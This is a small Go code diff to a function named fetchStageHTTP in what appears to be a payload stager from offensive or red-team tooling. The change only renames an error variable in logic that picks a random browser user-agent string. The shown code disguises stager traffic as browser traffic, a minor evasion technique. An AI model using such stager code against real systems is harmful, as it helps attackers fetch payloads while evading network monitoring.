@@ -181,7 +181,7 @@ func (s *Stager) fetchStageHTTP() ([]byte, error) {
 
 	ua := s.config.UserAgent
 	if ua == "" {
-		if db, err := useragent.Load(); err == nil {
+		if db, loadErr := useragent.Load(); loadErr == nil {
 			ua = db.RandomString("Mozilla/5.0")
 		} else {
 			ua = "Mozilla/5.0"
